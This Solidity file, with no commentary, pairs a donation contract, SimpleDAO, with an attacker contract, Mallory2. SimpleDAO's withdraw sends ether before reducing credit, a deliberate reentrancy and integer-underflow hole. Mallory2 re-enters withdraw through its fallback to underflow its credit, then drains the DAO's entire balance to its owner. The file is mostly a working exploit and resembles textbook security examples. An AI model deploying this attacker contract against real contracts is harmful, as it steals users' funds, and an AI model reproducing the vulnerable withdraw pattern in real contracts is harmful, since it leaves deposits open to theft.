pragma solidity ^0.4.24;

contract SimpleDAO {
  mapping (address => uint) public credit;

  function donate(address to) public payable {
    credit[to] += msg.value;
  }

  function withdraw(uint amount) public {
    if (credit[msg.sender]>= amount) {
      if (msg.sender.call.value(amount)()) {
        credit[msg.sender]-=amount;
      }
    }
  }

  function queryCredit(address to) public view returns (uint) {
    return credit[to];
  }

  function() public payable {}
}

contract Mallory2 {
  SimpleDAO public dao;
  address owner;
  bool public performAttack = true;

  constructor(SimpleDAO addr) public {
    owner = msg.sender;
    dao = addr;
  }

  function attack() public payable {
    dao.donate.value(1)(this);
    dao.withdraw(1);
  }

  function getJackpot() public {
    dao.withdraw(address(dao).balance);
    owner.transfer(address(this).balance);
    performAttack = true;
  }

  function() public payable {
    if (performAttack) {
       performAttack = false;
       dao.withdraw(1);
    }
  }
}